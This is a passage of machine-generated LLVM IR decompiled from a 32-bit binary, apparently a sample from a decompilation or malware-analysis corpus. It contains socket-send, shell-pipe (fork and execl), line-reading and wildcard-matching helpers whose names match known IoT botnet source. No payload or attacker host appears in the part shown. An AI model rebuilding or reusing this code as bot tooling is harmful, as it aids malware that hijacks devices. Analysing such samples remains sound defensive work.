  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_8048681 ], [ %stack_var_-28.0, %dec_label_pc_804890f ]
  %v4_8048920 = icmp eq i32* %arg1, null
  br i1 %v4_8048920, label %dec_label_pc_804892e, label %dec_label_pc_8048926

dec_label_pc_8048926:                             ; preds = %dec_label_pc_8048920
  %v2_8048929 = load i32, i32* %arg1, align 4
  %v1_804892b = inttoptr i32 %v2_8048929 to i8*
  store i8 0, i8* %v1_804892b, align 1
  br label %dec_label_pc_804892e

dec_label_pc_804892e:                             ; preds = %dec_label_pc_8048920, %dec_label_pc_8048926
  %v2_8048931 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048931, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804890f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_80486c3, { 1, 0 }
  uselistorder i8* %v22_8048681, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804892e, { 1, 0 }
  uselistorder label %dec_label_pc_804890f, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804873c, { 1, 0 }
  uselistorder label %dec_label_pc_80486f9, { 1, 0 }
  uselistorder label %dec_label_pc_80486c3, { 1, 0 }
  uselistorder label %dec_label_pc_8048673, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048933 = load i32, i32* @ebp, align 4
  store i32 %v0_8048933, i32* %stack_var_-4, align 4
  %v4_8048933 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048933, i32* @ebp, align 4
  %v4_804893c = ptrtoint i32* %stack_var_8 to i32
  %v4_8048954 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804893c)
  %v2_8048959 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048959, i32* @ebp, align 4
  ret i32 %v4_8048954

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804895b = load i32, i32* @ebp, align 4
  store i32 %v0_804895b, i32* %stack_var_-4, align 4
  %v4_804895b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804895b, i32* @ebp, align 4
  %v4_8048964 = ptrtoint i32* %stack_var_12 to i32
  %v4_804897b = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048964)
  %v2_8048980 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048980, i32* @ebp, align 4
  ret i32 %v4_804897b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048985 = load i32, i32* @edi, align 4
  store i32 %v0_8048985, i32* %stack_var_-8, align 4
  %v1_8048990 = call i32 @malloc(i32 2048)
  store i32 %v1_8048990, i32* %stack_var_-20, align 4
  %v3_80489b1 = inttoptr i32 %v1_8048990 to i8*
  %v4_80489b1 = call i32 @__GI_memset(i8* %v3_80489b1, i32 0, i32 2048)
  %v4_80489bf = ptrtoint i32* %stack_var_12 to i32
  %v4_80489d6 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_80489bf)
  %v3_80489ec = call i32 @_strlen(i8* %v3_80489b1)
  %v6_80489f3 = add i32 %v1_8048990, %v3_80489ec
  %v1_80489f6 = inttoptr i32 %v6_80489f3 to i8*
  store i8 10, i8* %v1_80489f6, align 1
  store i32 %v1_8048990, i32* @edi, align 4
  %v3_8048a0a = call i32 @_strlen(i8* %v3_80489b1)
  %v4_8048a2a = call i32 @__libc_send(i32 %arg1, i32 %v1_8048990, i32 %v3_8048a0a, i32 16384)
  %v1_8048a38 = call i32 @free(i32 %v1_8048990)
  %v2_8048a43 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048a43, i32* @edi, align 4
  ret i32 %v4_8048a2a

; uselistorder directives
  uselistorder i32 %v1_8048990, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048a49 = load i32, i32* @edi, align 4
  store i32 %v0_8048a49, i32* %stack_var_-8, align 4
  %v4_8048a4d = ptrtoint i8* %arg2 to i32
  %v2_8048a50 = load i8, i8* %arg2, align 1
  %v10_8048a53 = icmp eq i8 %v2_8048a50, 114
  br i1 %v10_8048a53, label %dec_label_pc_8048a61, label %dec_label_pc_8048a57

dec_label_pc_8048a57:                             ; preds = %entry
  %v2_8048a5a = load i8, i8* %arg2, align 1
  %v10_8048a5d = icmp eq i8 %v2_8048a5a, 119
  %v1_8048a5f = icmp eq i1 %v10_8048a5d, false
  br i1 %v1_8048a5f, label %dec_label_pc_8048c23, label %dec_label_pc_8048a61

dec_label_pc_8048a61:                             ; preds = %dec_label_pc_8048a57, %entry
  %v1_8048a64 = add i32 %v4_8048a4d, 1
  %v1_8048a65 = inttoptr i32 %v1_8048a64 to i8*
  %v2_8048a65 = load i8, i8* %v1_8048a65, align 1
  %v4_8048a68 = icmp eq i8 %v2_8048a65, 0
  br i1 %v4_8048a68, label %dec_label_pc_8048a78, label %dec_label_pc_8048c23

dec_label_pc_8048a78:                             ; preds = %dec_label_pc_8048a61
  %v2_8048a78 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8048a7e = call i32 @__GI_pipe(i32 %v2_8048a78)
  %v2_8048a83 = icmp slt i32 %v2_8048a7e, 0
  %v1_8048a85 = icmp eq i1 %v2_8048a83, false
  br i1 %v1_8048a85, label %dec_label_pc_8048a93, label %dec_label_pc_8048c23

dec_label_pc_8048a93:                             ; preds = %dec_label_pc_8048a78
  %v0_8048a93 = load i8*, i8** @global_var_8059920.19, align 4
  %v2_8048a98 = icmp eq i8* %v0_8048a93, null
  %v1_8048a9a = icmp eq i1 %v2_8048a98, false
  br i1 %v1_8048a9a, label %bb, label %dec_label_pc_8048a9c

dec_label_pc_8048a9c:                             ; preds = %dec_label_pc_8048a93
  %v1_8048a9c = call i32 @getdtablesize(i32 %tmp11)
  %tmp19 = icmp slt i32 %v1_8048a9c, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048ab6, label %dec_label_pc_8048c23

dec_label_pc_8048ab6:                             ; preds = %dec_label_pc_8048a9c
  %v2_8048ab9 = mul i32 %v1_8048a9c, 4
  %v2_8048abf = call i32 @malloc(i32 %v2_8048ab9)
  %v1_8048ac4 = inttoptr i32 %v2_8048abf to i8*
  store i8* %v1_8048ac4, i8** @global_var_8059920.19, align 32
  %v2_8048ace = icmp eq i32 %v2_8048abf, 0
  %v1_8048ad0 = icmp eq i1 %v2_8048ace, false
  br i1 %v1_8048ad0, label %dec_label_pc_8048ade, label %dec_label_pc_8048c23

dec_label_pc_8048ade:                             ; preds = %dec_label_pc_8048ab6
  %v1_8048ae1 = mul i32 %v1_8048a9c, 4
  store i32 %v2_8048abf, i32* @edi, align 4
  %v1_8048af2 = and i32 %v2_8048abf, -256
  %v5_8048af4 = call i8* @_memset(i8* %v1_8048ac4, i32 %v1_8048af2, i32 %v1_8048ae1)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048a93, %dec_label_pc_8048ade
  %v0_8048af6 = call i32 @__vfork()
  %v13_8048b04 = icmp eq i32 %v0_8048af6, -1
  br i1 %v13_8048b04, label %dec_label_pc_8048b15, label %dec_label_pc_8048b0a

dec_label_pc_8048b0a:                             ; preds = %bb
  %v4_8048b0a = icmp eq i32 %v0_8048af6, 0
  %v2_8048b3a = load i8, i8* %arg2, align 1
  %v10_8048b3d = icmp eq i8 %v2_8048b3a, 114
  %v1_8048b3f = icmp eq i1 %v10_8048b3d, false
  br i1 %v4_8048b0a, label %dec_label_pc_8048b37, label %dec_label_pc_8048bdb

dec_label_pc_8048b15:                             ; preds = %bb
  %v3_8048b15 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b1b = call i32 @__libc_close(i32 %v3_8048b15)
  %v2_8048b26 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048c23

dec_label_pc_8048b37:                             ; preds = %dec_label_pc_8048b0a
  br i1 %v1_8048b3f, label %dec_label_pc_8048b74, label %dec_label_pc_8048b41

dec_label_pc_8048b41:                             ; preds = %dec_label_pc_8048b37
  %v9_8048b44 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048b44, label %dec_label_pc_8048b67, label %dec_label_pc_8048b49

dec_label_pc_8048b49:                             ; preds = %dec_label_pc_8048b41
  %v4_8048b57 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048b62 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b67

dec_label_pc_8048b67:                             ; preds = %dec_label_pc_8048b41, %dec_label_pc_8048b49
  %v3_8048b67 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b6d = call i32 @__libc_close(i32 %v3_8048b67)
  br label %dec_label_pc_8048ba4

dec_label_pc_8048b74:                             ; preds = %dec_label_pc_8048b37
  %v3_8048b74 = load i32, i32* %stack_var_-24, align 4
  %v1_8048b77 = icmp eq i32 %v3_8048b74, 0
  br i1 %v1_8048b77, label %dec_label_pc_8048b99, label %dec_label_pc_8048b7b

dec_label_pc_8048b7b:                             ; preds = %dec_label_pc_8048b74
  %v4_8048b89 = call i32 @dup2(i32 %v3_8048b74, i32 0)
  %v3_8048b8e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b94 = call i32 @__libc_close(i32 %v3_8048b8e)
  br label %dec_label_pc_8048b99

dec_label_pc_8048b99:                             ; preds = %dec_label_pc_8048b74, %dec_label_pc_8048b7b
  %v2_8048b9f = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ba4

dec_label_pc_8048ba4:                             ; preds = %dec_label_pc_8048b67, %dec_label_pc_8048b99
  %v8_8048bca = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8052a2f.22 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052a2c.21 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052a29.20 to i32), i32 %arg1, i32 0)
  %v2_8048bd6 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048bdb:                             ; preds = %dec_label_pc_8048b0a
  br i1 %v1_8048b3f, label %dec_label_pc_8048bf8, label %dec_label_pc_8048be5

dec_label_pc_8048be5:                             ; preds = %dec_label_pc_8048bdb
  %v3_8048be5 = load i32, i32* %stack_var_-24, align 4
  %v2_8048bf1 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048c09

dec_label_pc_8048bf8:                             ; preds = %dec_label_pc_8048bdb
  %v3_8048bfe = load i32, i32* %stack_var_-24, align 4
  %v2_8048c04 = call i32 @__libc_close(i32 %v3_8048bfe)
  br label %dec_label_pc_8048c09

dec_label_pc_8048c09:                             ; preds = %dec_label_pc_8048be5, %dec_label_pc_8048bf8
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048bf8 ], [ %v3_8048be5, %dec_label_pc_8048be5 ]
  %v2_8048c0c = mul i32 %stack_var_-28.0, 4
  %v0_8048c11 = load i8*, i8** @global_var_8059920.19, align 4
  %v1_8048c11 = ptrtoint i8* %v0_8048c11 to i32
  %v2_8048c16 = add i32 %v1_8048c11, %v2_8048c0c
  %v2_8048c1b = inttoptr i32 %v2_8048c16 to i32*
  store i32 %v0_8048af6, i32* %v2_8048c1b, align 4
  br label %dec_label_pc_8048c23

dec_label_pc_8048c23:                             ; preds = %dec_label_pc_8048ab6, %dec_label_pc_8048a9c, %dec_label_pc_8048a78, %dec_label_pc_8048a57, %dec_label_pc_8048a61, %dec_label_pc_8048b15, %dec_label_pc_8048c09
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048b15 ], [ %stack_var_-28.0, %dec_label_pc_8048c09 ], [ -1, %dec_label_pc_8048a61 ], [ -1, %dec_label_pc_8048a57 ], [ -1, %dec_label_pc_8048a78 ], [ -1, %dec_label_pc_8048a9c ], [ -1, %dec_label_pc_8048ab6 ]
  %v2_8048c29 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048c29, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048af6, { 1, 2, 0 }
  uselistorder i32 %v1_8048a9c, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048c23, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048c09, { 1, 0 }
  uselistorder label %dec_label_pc_8048ba4, { 1, 0 }
  uselistorder label %dec_label_pc_8048b99, { 1, 0 }
  uselistorder label %dec_label_pc_8048b67, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048c2c = load i32, i32* @ebp, align 4
  store i32 %v0_8048c2c, i32* %stack_var_-4, align 4
  %v0_8048c35 = load i8*, i8** @global_var_8059920.19, align 4
  %v2_8048c3a = icmp eq i8* %v0_8048c35, null
  br i1 %v2_8048c3a, label %dec_label_pc_8048d99, label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %entry
  %v1_8048c35 = ptrtoint i8* %v0_8048c35 to i32
  %v2_8048c41 = mul i32 %arg1, 4
  %v2_8048c4b = add i32 %v1_8048c35, %v2_8048c41
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v1_8048c50 = icmp eq i32 %v2_8048c4e, 0
  %v1_8048c52 = icmp eq i1 %v1_8048c50, false
  br i1 %v1_8048c52, label %dec_label_pc_8048c63, label %dec_label_pc_8048d99

dec_label_pc_8048c63:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c69 = call i32 @__libc_close(i32 %arg1)
  %v2_8048c6e = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048c77 = call i32 @sigemptyset(i32 %v2_8048c6e)
  %v2_8048c8d = call i32 @__GI_sigaddset(i32 %v2_8048c6e, i32 2)
  %v2_8048ca3 = call i32 @__GI_sigaddset(i32 %v2_8048c6e, i32 3)
  %v2_8048cb9 = call i32 @__GI_sigaddset(i32 %v2_8048c6e, i32 1)
  %v4_8048cc4 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048cd9 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048cd9 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048cd9, i32 %v4_8048cc4)
  %v2_8048cf8 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %dec_label_pc_8048d19, %dec_label_pc_8048c63
  %v0_8048ce6 = load i8*, i8** @global_var_8059920.19, align 4
  %v1_8048ce6 = ptrtoint i8* %v0_8048ce6 to i32
  %v2_8048ceb = add i32 %v1_8048ce6, %v2_8048c41
  %v1_8048cee = inttoptr i32 %v2_8048ceb to i32*
  %v2_8048cee = load i32, i32* %v1_8048cee, align 4
  %v3_8048d05 = call i32 @__libc_waitpid(i32 %v2_8048cee, i32 %v2_8048cf8, i32 0)
  %v13_8048d10 = icmp eq i32 %v3_8048d05, -1
  %v1_8048d17 = icmp eq i1 %v13_8048d10, false
  br i1 %v1_8048d17, label %dec_label_pc_8048d25, label %dec_label_pc_8048d19

dec_label_pc_8048d19:                             ; preds = %dec_label_pc_8048cde
  %v1_8048d19 = call i32 @__errno_location(i32 %v3_8048d05)
  %v1_8048d1e = inttoptr i32 %v1_8048d19 to i32*
  %v2_8048d1e = load i32, i32* %v1_8048d1e, align 4
  %v9_8048d20 = icmp eq i32 %v2_8048d1e, 4
  br i1 %v9_8048d20, label %dec_label_pc_8048cde, label %dec_label_pc_8048d25

dec_label_pc_8048d25:                             ; preds = %dec_label_pc_8048d19, %dec_label_pc_8048cde
  %v13_8048d10.lcssa = phi i1 [ true, %dec_label_pc_8048d19 ], [ false, %dec_label_pc_8048cde ]
  %v3_8048d3e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048d3e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048d3e, i32 0)
  %v2_8048d49 = mul i32 %tmp6, 4
  %v0_8048d4e = load i8*, i8** @global_var_8059920.19, align 4
  %v1_8048d4e = ptrtoint i8* %v0_8048d4e to i32
  %v2_8048d53 = add i32 %v1_8048d4e, %v2_8048d49
  %v1_8048d56 = inttoptr i32 %v2_8048d53 to i32*
  store i32 0, i32* %v1_8048d56, align 4
  br i1 %v13_8048d10.lcssa, label %dec_label_pc_8048d8d, label %dec_label_pc_8048d65

dec_label_pc_8048d65:                             ; preds = %dec_label_pc_8048d25
  %v3_8048d65 = load i32, i32* %stack_var_-268, align 4
  %v1_8048d71 = and i32 %v3_8048d65, 65280
  %v2_8048d781 = udiv i32 %v1_8048d71, 256
  br label %dec_label_pc_8048d8d

dec_label_pc_8048d8d:                             ; preds = %dec_label_pc_8048d25, %dec_label_pc_8048d65
  %storemerge2 = phi i32 [ %v2_8048d781, %dec_label_pc_8048d65 ], [ -1, %dec_label_pc_8048d25 ]
  %v2_8048d9f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048d99

dec_label_pc_8048d99:                             ; preds = %entry, %dec_label_pc_8048c3e, %dec_label_pc_8048d8d
  %v2_8048d9f = phi i32 [ %v2_8048d9f.pre, %dec_label_pc_8048d8d ], [ %v0_8048c2c, %dec_label_pc_8048c3e ], [ %v0_8048c2c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048d8d ], [ -1, %dec_label_pc_8048c3e ], [ -1, %entry ]
  store i32 %v2_8048d9f, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048d05, { 1, 0 }
  uselistorder i32 %v2_8048c41, { 1, 0 }
  uselistorder i8* %v0_8048c35, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_8059920.19, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d99, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048d8d, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048de0

dec_label_pc_8048db7:                             ; preds = %dec_label_pc_8048de8
  %v3_8048dcf = inttoptr i32 %v5_8048deb to i32*
  %v4_8048dcf = call i32 @__libc_read(i32 %arg3, i32* %v3_8048dcf, i32 1)
  %v4_8048dd7 = add nuw i32 %storemerge113, 1
  %v8_8048dda = icmp eq i32 %v4_8048dcf, 0
  %v12_8048dda = icmp eq i32 %v4_8048dcf, 1
  %v1_8048dde = icmp eq i1 %v12_8048dda, false
  br i1 %v1_8048dde, label %dec_label_pc_8048df6, label %dec_label_pc_8048de0

dec_label_pc_8048de0:                             ; preds = %entry, %dec_label_pc_8048db7
  %v8_8048dda14 = phi i1 [ false, %entry ], [ %v8_8048dda, %dec_label_pc_8048db7 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048dd7, %dec_label_pc_8048db7 ]
  %v5_8048de6 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048de6, label %dec_label_pc_8048de8, label %dec_label_pc_8048df6

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048de0
  %v5_8048deb = add i32 %storemerge113, %arg1
  %v1_8048dee = add i32 %v5_8048deb, -1
  %v1_8048def = inttoptr i32 %v1_8048dee to i8*
  %v2_8048def = load i8, i8* %v1_8048def, align 1
  %v10_8048df2 = icmp eq i8 %v2_8048def, 10
  %v1_8048df4 = icmp eq i1 %v10_8048df2, false
  br i1 %v1_8048df4, label %dec_label_pc_8048db7, label %dec_label_pc_8048df6

dec_label_pc_8048df6:                             ; preds = %dec_label_pc_8048de0, %dec_label_pc_8048de8, %dec_label_pc_8048db7
  %v8_8048dda.lcssa = phi i1 [ %v8_8048dda14, %dec_label_pc_8048de0 ], [ %v8_8048dda14, %dec_label_pc_8048de8 ], [ %v8_8048dda, %dec_label_pc_8048db7 ]
  br i1 %v8_8048dda.lcssa, label %dec_label_pc_8048e0b, label %dec_label_pc_8048dfc

dec_label_pc_8048dfc:                             ; preds = %dec_label_pc_8048df6
  br label %dec_label_pc_8048e0b

dec_label_pc_8048e0b:                             ; preds = %dec_label_pc_8048df6, %dec_label_pc_8048dfc
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048dfc ], [ 0, %dec_label_pc_8048df6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048deb, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048dda14, { 1, 0 }
  uselistorder i1 %v8_8048dda, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e0b, { 1, 0 }
  uselistorder label %dec_label_pc_8048df6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048de0, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048e3f1 = ptrtoint i8* %arg1 to i32
  %v2_8048e422 = load i8, i8* %arg1, align 1
  %v4_8048e454 = icmp eq i8 %v2_8048e422, 0
  br i1 %v4_8048e454, label %dec_label_pc_8048e4f, label %dec_label_pc_8048e49

dec_label_pc_8048e1f:                             ; preds = %dec_label_pc_8048e49
  %v2_8048e24 = mul i32 %stack_var_-8.010, 16
  %v2_8048e2a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048e2a = zext i8 %v2_8048e2a to i32
  %v1_8048e30 = mul nuw nsw i32 %v3_8048e2a, 4
  %v2_8048e30 = add i32 %v1_8048e30, ptrtoint (i32* @global_var_8052a40.23 to i32)
  %v3_8048e30 = inttoptr i32 %v2_8048e30 to i32*
  %v4_8048e30 = load i32, i32* %v3_8048e30, align 4
  %v2_8048e37 = or i32 %v4_8048e30, %v2_8048e24
  %v5_8048e3c = add i32 %v4_8048e3f12, 1
  %v22_8048e3c = inttoptr i32 %v5_8048e3c to i8*
  %v2_8048e42 = load i8, i8* %v22_8048e3c, align 1
  %v4_8048e45 = icmp eq i8 %v2_8048e42, 0
  br i1 %v4_8048e45, label %dec_label_pc_8048e4f, label %dec_label_pc_8048e49

dec_label_pc_8048e49:                             ; preds = %entry, %dec_label_pc_8048e1f
  %v4_8048e3f12 = phi i32 [ %v5_8048e3c, %dec_label_pc_8048e1f ], [ %v4_8048e3f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048e3c, %dec_label_pc_8048e1f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048e37, %dec_label_pc_8048e1f ], [ 0, %entry ]
  %v5_8048e49 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048e4d = icmp eq i1 %v5_8048e49, false
  br i1 %v1_8048e4d, label %dec_label_pc_8048e1f, label %dec_label_pc_8048e4f

dec_label_pc_8048e4f:                             ; preds = %dec_label_pc_8048e1f, %dec_label_pc_8048e49, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048e37, %dec_label_pc_8048e1f ], [ %stack_var_-8.010, %dec_label_pc_8048e49 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048e4f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048e49, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048e57 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e57, i32* %stack_var_-8, align 4
  %v4_8048e5b = ptrtoint i8* %arg1 to i32
  %v2_8048e5e = load i8, i8* %arg1, align 1
  %v12_8048e67 = icmp eq i8 %v2_8048e5e, 42
  br i1 %v12_8048e67, label %dec_label_pc_8048e8f, label %dec_label_pc_8048e6d

dec_label_pc_8048e6d:                             ; preds = %entry
  %v12_8048e6d = icmp eq i8 %v2_8048e5e, 63
  br i1 %v12_8048e6d, label %dec_label_pc_8048ee2, label %dec_label_pc_8048e73

dec_label_pc_8048e73:                             ; preds = %dec_label_pc_8048e6d
  %v4_8048e73 = icmp eq i8 %v2_8048e5e, 0
  br i1 %v4_8048e73, label %dec_label_pc_8048e7e, label %dec_label_pc_8048f1c

dec_label_pc_8048e7e:                             ; preds = %dec_label_pc_8048e73
  %v2_8048e81 = load i8, i8* %tmp12, align 1
  %v3_8048e81 = zext i8 %v2_8048e81 to i32
  br label %dec_label_pc_8048f72

dec_label_pc_8048e8f:                             ; preds = %entry
  %v1_8048e92 = add i32 %v4_8048e5b, 1
  %v4_8048e9a = inttoptr i32 %v1_8048e92 to i8*
  %v5_8048e9d = call i32 @wildString(i8* %v4_8048e9a, i32 %arg2)
  %v1_8048ea2 = icmp eq i32 %v5_8048e9d, 0
  br i1 %v1_8048ea2, label %dec_label_pc_8048ed0, label %dec_label_pc_8048ea6

dec_label_pc_8048ea6:                             ; preds = %dec_label_pc_8048e8f
  %v2_8048ea9 = load i8, i8* %tmp12, align 1
  %v4_8048eac = icmp eq i8 %v2_8048ea9, 0
  br i1 %v4_8048eac, label %dec_label_pc_8048ed7, label %dec_label_pc_8048eb0

dec_label_pc_8048eb0:                             ; preds = %dec_label_pc_8048ea6
  %v1_8048eb3 = add i32 %arg2, 1
  %v5_8048ebe = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048eb3)
  %v1_8048ec3 = icmp eq i32 %v5_8048ebe, 0
  br i1 %v1_8048ec3, label %dec_label_pc_8048ed0, label %dec_label_pc_8048ed7

dec_label_pc_8048ed0:                             ; preds = %dec_label_pc_8048eb0, %dec_label_pc_8048e8f
  br label %dec_label_pc_8048ed7

dec_label_pc_8048ed7:                             ; preds = %dec_label_pc_8048ea6, %dec_label_pc_8048eb0, %dec_label_pc_8048ed0
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8048ed0 ], [ 1, %dec_label_pc_8048eb0 ], [ 1, %dec_label_pc_8048ea6 ]
  br label %dec_label_pc_8048f72

dec_label_pc_8048ee2:                             ; preds = %dec_label_pc_8048e6d
  %v2_8048ee5 = load i8, i8* %tmp12, align 1
  %v4_8048ee8 = icmp eq i8 %v2_8048ee5, 0
  br i1 %v4_8048ee8, label %dec_label_pc_8048f14, label %dec_label_pc_8048eec

dec_label_pc_8048eec:                             ; preds = %dec_label_pc_8048ee2
  %v1_8048eef = add i32 %arg2, 1
  %v1_8048ef3 = add i32 %v4_8048e5b, 1
  %v4_8048ef8 = inttoptr i32 %v1_8048ef3 to i8*
  %v5_8048efb = call i32 @wildString(i8* %v4_8048ef8, i32 %v1_8048eef)
  %v1_8048f00 = icmp ne i32 %v5_8048efb, 0
  %. = zext i1 %v1_8048f00 to i32
  br label %dec_label_pc_8048f14

dec_label_pc_8048f14:                             ; preds = %dec_label_pc_8048eec, %dec_label_pc_8048ee2
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048ee2 ], [ %., %dec_label_pc_8048eec ]
  br label %dec_label_pc_8048f72

dec_label_pc_8048f1c:                             ; preds = %dec_label_pc_8048e73
  %v2_8048f1f = load i8, i8* %arg1, align 1
  %v3_8048f1f = zext i8 %v2_8048f1f to i32
  %v2_8048f28 = call i32 @__GI_toupper(i32 %v3_8048f1f)
  store i32 %v2_8048f28, i32* @ebx, align 4
